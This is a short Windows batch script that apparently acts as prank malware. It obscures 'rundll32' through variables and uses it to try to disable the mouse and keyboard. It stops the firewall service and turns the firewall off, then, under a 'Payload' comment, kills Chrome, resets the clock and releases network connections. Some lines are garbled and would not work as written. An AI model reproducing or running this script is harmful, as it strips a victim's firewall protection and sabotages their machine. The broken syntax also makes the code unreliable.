cd C:\WINDOWS\system32
set dll1=run
set dll2=dll32
set m=mouse
set k=keyboard

%dll1%%dll2% %m%,disable
%dll1%%dll2% %k%,disable

REM Disable FireWall
net stop"MpsSvc"
taskkill /f /t /im"FirewallControlPanel.exe"
if %errorlevel%==1 tskill FirewallControlPanel
netsh firewall set opmode mode=disable

REM Payload
tskill chrome
time 00:00
ipconfig /release + vbnewlineif %ERRORLEVEL%==1 ipconfig /release_all